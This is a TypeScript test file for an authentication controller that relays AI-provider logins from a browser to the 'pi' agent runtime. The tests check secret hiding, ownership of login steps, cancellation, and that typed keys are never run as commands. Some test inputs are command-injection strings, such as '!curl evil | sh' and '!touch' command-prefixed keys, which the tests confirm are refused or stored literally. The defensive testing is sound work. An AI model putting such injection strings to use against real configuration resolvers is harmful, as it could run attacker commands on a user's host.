import test from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtemp, readFile, rm, stat, writeFile, access } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AuthInteraction } from "@earendil-works/pi-ai";
import { AuthController, type AuthRuntime } from "../src/extension/auth-controller.js";
import { configValueKind } from "../src/extension/config-value.js";

type Login = (provider: string, type: "api_key" | "oauth", interaction: AuthInteraction) => Promise<{ type: string; key?: string }>;
class Scripted implements AuthRuntime {
  stored = new Map<string, { type: "api_key" | "oauth"; key?: string }>(); loggedOut: string[] = [];
  constructor(public script: Login) {}
  getProviders() { return [{ id: "acme", name: "Acme AI", auth: { apiKey: { name: "Acme API key", login: true }, oauth: { name: "Acme subscription" } } },
    { id: "kimi-coding", name: "Kimi For Coding", auth: { apiKey: { name: "Kimi API key", login: true }, oauth: { name: "Kimi Code (subscription)" } } },
    { id: "cloud", name: "Cloud Ambient", auth: { apiKey: { name: "Cloud credentials" } } }]; }
  getModels(id: string) { return id === "acme" ? [1, 2] : []; }
  async listCredentials() { return [...this.stored].map(([providerId, value]) => ({ providerId, type: value.type })); }
  async login(provider: string, type: "api_key" | "oauth", interaction: AuthInteraction) { const credential = await this.script(provider, type, interaction); this.stored.set(provider, credential as never); return credential; }
  async logout(provider: string) { this.loggedOut.push(provider); this.stored.delete(provider); }
}
function setup(script: Login, limitMs?: number) {
  const runtime = new Scripted(script); const changes: string[] = []; let published = 0;
  const controller = new AuthController({ agentDir: "/unused", createRuntime: async () => runtime, publish: () => { published++; }, changed: (provider, change) => changes.push(`${change}:${provider}`), ...(limitMs ? { limitMs } : {}), webOAuth: new Set(["kimi-coding"]) });
  return { controller, runtime, changes, published: () => published };
}
const until = async <T>(read: () => T | undefined | null | false, label = "condition"): Promise<T> => {
  for (let index = 0; index < 400; index++) { const value = read(); if (value) return value; await new Promise(resolve => setTimeout(resolve, 5)); }
  throw new Error(`Timed out: ${label}`);
};
const keyLogin: Login = async (_provider, type, interaction) => ({ type, key: await interaction.prompt({ type: "secret", message: "Enter API key", placeholder: "sk-..." }) });

test("the provider list names login methods and the stored kind without any secret", async () => {
  const { controller, runtime } = setup(keyLogin);
  runtime.stored.set("acme", { type: "api_key", key: "sk-PRIVATE-VALUE" });
  const providers = await controller.providers();
  assert.deepEqual(providers.map(provider => [provider.id, provider.stored, provider.knownModels]), [["acme", "api_key", 2], ["kimi-coding", undefined, 0], ["cloud", undefined, 0]]);
  assert.deepEqual(providers[0]!.methods, [{ type: "api_key", label: "Acme API key", web: true }, { type: "oauth", label: "Acme subscription", web: false, reason: "callback" }]);
  assert.deepEqual(providers[1]!.methods[1], { type: "oauth", label: "Kimi Code (subscription)", web: true });
  assert.deepEqual(providers[2]!.methods, [{ type: "api_key", label: "Cloud credentials", web: false, reason: "ambient" }]);
  assert(!JSON.stringify(providers).includes("PRIVATE"));
});
test("an API key login: one secret step for the owner only, answered once, saved, and reported without the key", async () => {
  const { controller, runtime, changes } = setup(keyLogin);
  const { operationId } = await controller.begin("owner", "acme", "api_key");
  const view = await until(() => controller.view("owner")?.step && controller.view("owner"));
  assert.equal(view.status, "running"); assert.equal(view.owner, true); assert.deepEqual({ ...view.step, id: "" }, { id: "", kind: "secret", message: "Enter API key", placeholder: "sk-..." });
  // Another signed-in page learns that something is running, and nothing about its steps.
  assert.deepEqual(Object.keys(controller.view("other")!).sort(), ["expiresAt", "id", "method", "owner", "providerId", "providerName", "startedAt", "status"]); assert.equal(controller.view("other")!.owner, false);
  await assert.rejects(controller.begin("other", "kimi-coding", "api_key"), { code: "account_busy" });
  await assert.rejects(controller.logout("acme"), { code: "account_busy" });
  assert.throws(() => controller.answer("other", operationId, view.step!.id, "sk-x"), { code: "not_owner" });
  assert.throws(() => controller.answer("owner", operationId, "wrong-step", "sk-x"), { code: "stale_step" });
  assert.throws(() => controller.answer("owner", "wrong-operation", view.step!.id, "sk-x"), { code: "operation_closed" });
  assert.throws(() => controller.answer("owner", operationId, view.step!.id, "   "), { code: "invalid_answer" });
  controller.answer("owner", operationId, view.step!.id, "sk-SECRET-123456");
  assert.throws(() => controller.answer("owner", operationId, view.step!.id, "sk-second"), { code: /stale_step|operation_closed/ });
  const done = await until(() => controller.view("owner")?.status === "saved" && controller.view("owner"));
  assert.equal(done.step, undefined); assert.equal(done.error, undefined); assert(!JSON.stringify(done).includes("SECRET"));
  assert.equal(controller.view("other"), null); assert.deepEqual(changes, ["login:acme"]); assert.equal(runtime.stored.get("acme")?.key, "sk-SECRET-123456");
  assert.equal(controller.busy, false);
});
test("a pasted key is always stored as a literal: nothing typed in the browser can become a host command", async () => {
  const marker = join(await mkdtemp(join(tmpdir(), "pi-pane-auth-")), "EXECUTED");
  try {
    for (const typed of [`!touch ${marker}`, "$HOME", "${PATH}", "sk-with-$-inside", "!", "$$already", "$!already", "plain-key"]) {
      const { controller, runtime } = setup(keyLogin);
      const { operationId } = await controller.begin("owner", "acme", "api_key");
      const step = await until(() => controller.view("owner")?.step);
      controller.answer("owner", operationId, step.id, typed);
      await until(() => controller.view("owner")?.status === "saved");
      const stored = runtime.stored.get("acme")!.key!;
      // What pi's resolver does with the stored text: $$ → $, a leading $! → !, and only a bare leading ! runs a command.
      assert.equal(configValueKind(stored), "literal", typed);
      assert.equal(stored.replace(/^\$!/, "!").replaceAll("$$", "$"), typed);
    }
    await assert.rejects(access(marker));
  } finally { await rm(join(marker, ".."), { recursive: true, force: true }); }
});
test("a key login's other fields are refused when they are not literal, and a non-literal stored key is removed", async () => {
  const twoFields: Login = async (_provider, type, interaction) => {
    const account = await interaction.prompt({ type: "text", message: "Account ID" });
    return { type, key: await interaction.prompt({ type: "secret", message: "API key" }), env: { ACCOUNT: account } } as never;
  };
  const { controller } = setup(twoFields);
  const { operationId } = await controller.begin("owner", "acme", "api_key");
  const first = await until(() => controller.view("owner")?.step);
  assert.throws(() => controller.answer("owner", operationId, first.id, "!curl evil | sh"), { code: "invalid_answer" });
  assert.throws(() => controller.answer("owner", operationId, first.id, "$HOME"), { code: "invalid_answer" });
  assert.equal(controller.view("owner")?.step?.id, first.id); // still open for a valid answer
  controller.answer("owner", operationId, first.id, "account-42");
  const second = await until(() => { const step = controller.view("owner")?.step; return step && step.id !== first.id && step; });
  controller.answer("owner", operationId, second.id, "sk-ok"); await until(() => controller.view("owner")?.status === "saved");
  // A login that would store a text field as the key cannot leave a command behind.
  const textAsKey = setup(async (_provider, type, interaction) => ({ type, key: `!${await interaction.prompt({ type: "select", message: "Region", options: [{ id: "eu", label: "EU" }] })}` }));
  const begun = await textAsKey.controller.begin("owner", "acme", "api_key");
  const select = await until(() => textAsKey.controller.view("owner")?.step);
  assert.throws(() => textAsKey.controller.answer("owner", begun.operationId, select.id, "us"), { code: "invalid_answer" });
  textAsKey.controller.answer("owner", begun.operationId, select.id, "eu");
  const failed = await until(() => textAsKey.controller.view("owner")?.status === "failed" && textAsKey.controller.view("owner"));
  assert.equal(failed.error?.code, "unsafe_key"); assert.deepEqual(textAsKey.runtime.loggedOut, ["acme"]); assert.deepEqual(textAsKey.changes, []);
});
test("a device-code login shows the code and address to the owner, keeps running without any page, and saves on approval", async () => {
  let approve!: () => void; let polls = 0;
  const { controller, changes } = setup(async (_provider, type, interaction) => {
    interaction.notify({ type: "device_code", userCode: "WDJB-MJHT", verificationUri: "https://provider.example/device", intervalSeconds: 5, expiresInSeconds: 900 });
    interaction.notify({ type: "progress", message: "Waiting for approval…" });
    await new Promise<void>((resolve, reject) => { approve = resolve; interaction.signal!.addEventListener("abort", () => reject(new Error("aborted"))); });
    polls++; interaction.notify({ type: "progress", message: "Approved" });
    return { type, access: "ACCESS-TOKEN", refresh: "REFRESH-TOKEN", expires: 1 } as never;
  });
  await assert.rejects(controller.begin("phone", "acme", "oauth"), { code: "unsupported_method" }); // a localhost-callback flow is not offered
  await assert.rejects(controller.begin("phone", "cloud", "api_key"), { code: "unsupported_method" });
  await assert.rejects(controller.begin("phone", "nope", "api_key"), { code: "unknown_provider" });
  await controller.begin("phone", "kimi-coding", "oauth");
  const view = await until(() => controller.view("phone")?.notices?.length === 2 && controller.view("phone"));
  assert.equal(view.step, undefined);
  assert.deepEqual(view.notices!.map(notice => notice.type), ["device_code", "progress"]);
  const code = view.notices![0] as { userCode: string; verificationUri: string; expiresAt: number };
  assert.equal(code.userCode, "WDJB-MJHT"); assert.equal(code.verificationUri, "https://provider.example/device"); assert(code.expiresAt > Date.now() + 800_000);
  assert(!JSON.stringify(controller.view("desktop")).includes("WDJB")); // the code is the owner's alone
  // The phone leaves for the provider's page: no call arrives for a while, and nothing depends on one.
  await new Promise(resolve => setTimeout(resolve, 60)); assert.equal(controller.view("phone")?.status, "running");
  approve();
  const done = await until(() => controller.view("phone")?.status === "saved" && controller.view("phone"));
  assert.equal(polls, 1); assert.deepEqual(changes, ["login:kimi-coding"]); assert(!JSON.stringify(done).includes("TOKEN")); assert(!JSON.stringify(done).includes("WDJB"));
});
test("callback, manual-code and select steps are relayed; a question pi withdraws disappears", async () => {
  const withdrawn = new AbortController(); const seen: string[] = [];
  const { controller } = setup(async (_provider, type, interaction) => {
    seen.push(await interaction.prompt({ type: "select", message: "How do you want to sign in?", options: [{ id: "browser", label: "Browser", description: "Opens a local callback" }, { id: "device", label: "Device code" }] }));
    interaction.notify({ type: "auth_url", url: "https://provider.example/authorize?state=STATE-VALUE", instructions: "Open this address" });
    // pi races a manual code against its callback listener and withdraws the question when the callback wins.
    const manual = interaction.prompt({ type: "manual_code", message: "Paste the code or the redirect address", signal: withdrawn.signal }).catch(() => "callback-won");
    seen.push(await manual);
    seen.push(await interaction.prompt({ type: "manual_code", message: "Paste again" }));
    return { type, access: "A", refresh: "R", expires: 1 } as never;
  });
  const { operationId } = await controller.begin("owner", "kimi-coding", "oauth");
  const select = await until(() => controller.view("owner")?.step);
  assert.deepEqual(select.options, [{ id: "browser", label: "Browser", description: "Opens a local callback" }, { id: "device", label: "Device code" }]);
  assert.throws(() => controller.answer("owner", operationId, select.id, "other"), { code: "invalid_answer" });
  controller.answer("owner", operationId, select.id, "device");
  const manual = await until(() => { const step = controller.view("owner")?.step; return step?.kind === "manual_code" && step; });
  assert.equal(controller.view("owner")!.notices![0]!.type, "auth_url");
  withdrawn.abort();
  const again = await until(() => { const step = controller.view("owner")?.step; return step && step.id !== manual.id && step; });
  assert.throws(() => controller.answer("owner", operationId, manual.id, "late"), { code: "stale_step" });
  // An OAuth answer is not a config value: it is passed on exactly as pasted.
  controller.answer("owner", operationId, again.id, "https://localhost:1455/cb?code=$abc&state=!x");
  await until(() => controller.view("owner")?.status === "saved");
  assert.deepEqual(seen, ["device", "callback-won", "https://localhost:1455/cb?code=$abc&state=!x"]);
});
test("cancel from any page, the time limit and the owner's lease ending all abort pi's flow and release its listeners", async () => {
  for (const [how, code] of [["cancel", "cancelled"], ["timeout", "timeout"], ["lease", "owner_gone"], ["dispose", "cancelled"]] as const) {
    let released = false; let listening = true;
    const { controller, runtime, changes } = setup(async (_provider, _type, interaction) => {
      interaction.notify({ type: "device_code", userCode: "AAAA-BBBB", verificationUri: "https://provider.example/device" });
      await new Promise<void>((_resolve, reject) => interaction.signal!.addEventListener("abort", () => { listening = false; released = true; reject(new Error("The operation was aborted")); }));
      return { type: "oauth" };
    }, how === "timeout" ? 40 : undefined);
    const { operationId } = await controller.begin("owner", "kimi-coding", "oauth");
    await until(() => controller.view("owner")?.notices);
    if (how === "cancel") { assert.throws(() => controller.cancel("unknown"), { code: "operation_closed" }); controller.cancel(operationId); } // a different page: cancel takes no lease
    else if (how === "lease") { controller.leaseEnded("someone-else"); assert.equal(controller.view("owner")?.status, "running"); controller.leaseEnded("owner"); }
    else if (how === "dispose") controller.dispose();
    const ended = await until(() => controller.view("owner")?.status === "cancelled" && controller.view("owner"));
    assert.equal(ended.error?.code, code); assert.equal(released, true); assert.equal(listening, false);
    assert.equal(ended.notices, undefined, "codes do not outlive the operation"); assert.deepEqual(changes, []); assert.equal(runtime.stored.size, 0);
    if (how !== "dispose") { assert.throws(() => controller.cancel(operationId), { code: "operation_closed" }); await controller.begin("next", "acme", "api_key"); controller.dispose(); }
    else await assert.rejects(controller.begin("next", "acme", "api_key"), { code: "host_stopped" });
  }
});
test("a cancel that races a submitted key ends as cancelled or saved, never as both", async () => {
  const { controller, runtime, changes } = setup(async (_provider, type, interaction) => {
    const key = await interaction.prompt({ type: "secret", message: "Key" });
    await new Promise(resolve => setTimeout(resolve, 10));
    if (interaction.signal!.aborted) throw new Error("aborted");
    return { type, key };
  });
  const { operationId } = await controller.begin("owner", "acme", "api_key");
  const step = await until(() => controller.view("owner")?.step);
  controller.answer("owner", operationId, step.id, "sk-race"); controller.cancel(operationId);
  const ended = await until(() => controller.view("owner")?.status !== "running" && controller.view("owner"));
  assert.equal(ended.status, "cancelled"); assert.deepEqual(changes, []); assert.equal(runtime.stored.size, 0);
});
test("a provider error that repeats what the user typed is reported without it", async () => {
  const { controller } = setup(async (_provider, _type, interaction) => {
    const key = await interaction.prompt({ type: "secret", message: "Key" });
    throw new Error(`401 Unauthorized: key ${key} is not valid for account. ${"x".repeat(900)}`);
  });
  const { operationId } = await controller.begin("owner", "acme", "api_key");
  const step = await until(() => controller.view("owner")?.step);
  controller.answer("owner", operationId, step.id, "sk-SENTINEL-$-0123456789");
  const failed = await until(() => controller.view("owner")?.status === "failed" && controller.view("owner"));
  assert.equal(failed.error?.code, "login_failed"); assert.match(failed.error!.message, /401 Unauthorized: key \[hidden\]/); assert(failed.error!.message.length <= 401);
  assert(!JSON.stringify(failed).includes("SENTINEL")); assert.equal(controller.view("other"), null);
});
test("logout removes only what pi stored and says so when there is nothing stored", async () => {
  const { controller, runtime, changes } = setup(keyLogin);
  runtime.stored.set("acme", { type: "api_key", key: "k" }); runtime.stored.set("kimi-coding", { type: "oauth" });
  await controller.logout("acme"); assert.deepEqual([...runtime.stored.keys()], ["kimi-coding"]); assert.deepEqual(changes, ["logout:acme"]);
  await assert.rejects(controller.logout("acme"), { code: "not_stored" }); await assert.rejects(controller.logout("cloud"), { code: "not_stored" });
});
test("pi's own runtime: listing never executes a stored key command, and a browser key is written literally with mode 600", async () => {
  const root = await mkdtemp(join(tmpdir(), "pi-pane-auth-real-")); const marker = join(root, "EXECUTED"); const authPath = join(root, "auth.json");
  try {
    await writeFile(authPath, JSON.stringify({ openai: { type: "api_key", key: `!touch ${marker}` }, "kimi-coding": { type: "oauth", access: "a", refresh: "r", expires: 0 } }), { mode: 0o600 });
    const changes: string[] = [];
    const controller = new AuthController({ agentDir: root, publish: () => {}, changed: (provider, change) => changes.push(`${change}:${provider}`) });
    const providers = await controller.providers();
    assert.equal(providers.find(provider => provider.id === "openai")?.stored, "api_key"); assert.equal(providers.find(provider => provider.id === "kimi-coding")?.stored, "oauth");
    assert(providers.length > 20); assert(providers.find(provider => provider.id === "anthropic")!.methods.some(method => method.type === "api_key" && method.web));
    // No OAuth login is offered from the browser by default: device-code flows are unverified, callback flows unsupported.
    assert.deepEqual(providers.find(provider => provider.id === "kimi-coding")!.methods.map(method => [method.type, method.web, method.reason]), [["api_key", true, undefined], ["oauth", false, "unverified"]]);
    await assert.rejects(controller.begin("page", "kimi-coding", "oauth"), { code: "unsupported_method" });
    assert.deepEqual(providers.find(provider => provider.id === "anthropic")!.methods.find(method => method.type === "oauth"), { type: "oauth", label: "Anthropic (Claude Pro/Max)", web: false, reason: "callback" });
    await assert.rejects(access(marker), "listing providers must not run a stored key command");
    // A real pi login of a built-in provider, with a key that would be a command if stored as typed.
    const typed = `!touch ${join(root, "FROM_BROWSER")}`;
    const { operationId } = await controller.begin("owner", "anthropic", "api_key");
    const step = await until(() => controller.view("owner")?.step, "pi's key prompt"); assert.equal(step.kind, "secret");
    controller.answer("owner", operationId, step.id, typed);
    await until(() => controller.view("owner")?.status === "saved", "saved");
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.equal(stored.anthropic.key, `$${typed}`); assert.equal(stored.openai.key, `!touch ${marker}`, "other providers are untouched"); assert.equal((await stat(authPath)).mode & 0o777, 0o600);
    await assert.rejects(access(join(root, "FROM_BROWSER"))); assert.deepEqual(changes, ["login:anthropic"]);
    // pi itself resolves the stored text back to exactly what was typed, without running it.
    const resolved = execFileSync(process.execPath, ["--input-type=module", "-e", `import { ModelRuntime } from "@earendil-works/pi-coding-agent"; const runtime = await ModelRuntime.create({ authPath: ${JSON.stringify(authPath)}, modelsPath: null, allowModelNetwork: false, refreshOnCreate: false }); const auth = await runtime.getAuth("anthropic"); process.stdout.write(JSON.stringify(auth?.auth.apiKey ?? null));`], { cwd: process.cwd(), env: { PATH: process.env.PATH ?? "", HOME: root } }).toString();
    assert.equal(JSON.parse(resolved), typed); await assert.rejects(access(join(root, "FROM_BROWSER")));
    await controller.logout("anthropic"); assert.equal(JSON.parse(await readFile(authPath, "utf8")).anthropic, undefined); assert.equal(JSON.parse(await readFile(authPath, "utf8")).openai.key, `!touch ${marker}`);
  } finally { await rm(root, { recursive: true, force: true }); }
});
test("pi's own runtime: a models.json provider gets its key through pi's login, stored literally in the auth file, and nothing in models.json is run", async () => {
  const root = await mkdtemp(join(tmpdir(), "pi-pane-auth-custom-")); const marker = join(root, "EXECUTED"); const authPath = join(root, "auth.json"), modelsPath = join(root, "models.json");
  try {
    await writeFile(authPath, "{}", { mode: 0o600 });
    const models = JSON.stringify({ providers: { local: { baseUrl: "http://127.0.0.1:9/v1", api: "openai-completions", models: [{ id: "m" }] },
      scripted: { baseUrl: "http://127.0.0.1:9/v1", api: "openai-completions", apiKey: `!touch ${marker}`, headers: { x: `!touch ${marker}` }, models: [{ id: "s" }] } } });
    await writeFile(modelsPath, models);
    const changes: string[] = [];
    const controller = new AuthController({ agentDir: root, publish: () => {}, changed: (provider, change) => changes.push(`${change}:${provider}`), customProviders: async () => new Set(["local", "scripted"]) });
    // pi's built-in list is unchanged by the file; the stored map covers providers pi does not know.
    assert.equal((await controller.providers()).some(provider => provider.id === "local"), false);
    assert.deepEqual([...(await controller.stored())], []);
    await assert.rejects(controller.begin("owner", "not-in-file", "api_key"), { code: "unknown_provider" });
    await assert.rejects(controller.begin("owner", "local", "oauth"), { code: "unknown_provider" });
    const typed = `!touch ${join(root, "FROM_BROWSER")} $HOME`;
    const { operationId } = await controller.begin("owner", "local", "api_key");
    const step = await until(() => controller.view("owner")?.step, "pi's key prompt"); assert.equal(step.kind, "secret");
    controller.answer("owner", operationId, step.id, typed);
    await until(() => controller.view("owner")?.status === "saved", "saved");
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.deepEqual(Object.keys(stored), ["local"]); assert.equal(stored.local.type, "api_key"); assert.equal(configValueKind(stored.local.key), "literal");
    assert.equal((await stat(authPath)).mode & 0o777, 0o600); assert.deepEqual(changes, ["login:local"]);
    assert.deepEqual([...(await controller.stored())], [["local", "api_key"]]);
    assert.equal(await readFile(modelsPath, "utf8"), models, "models.json is not written by a login");
    // A provider whose file entry carries a command as its key: storing a key for it runs nothing either.
    const second = await controller.begin("owner", "scripted", "api_key");
    const next = await until(() => controller.view("owner")?.step, "second prompt"); controller.answer("owner", second.operationId, next.id, "sk-plain");
    await until(() => controller.view("owner")?.status === "saved", "second saved");
    await controller.logout("local"); assert.deepEqual([...(await controller.stored())], [["scripted", "api_key"]]);
    await assert.rejects(controller.logout("local"), { code: "not_stored" });
    await assert.rejects(access(marker)); await assert.rejects(access(join(root, "FROM_BROWSER")));
    // A models.json that cannot be parsed does not break the account list or the stored map.
    await writeFile(modelsPath, "{ broken");
    assert((await controller.providers()).length > 20); assert.deepEqual([...(await controller.stored())], [["scripted", "api_key"]]);
  } finally { await rm(root, { recursive: true, force: true }); }
});
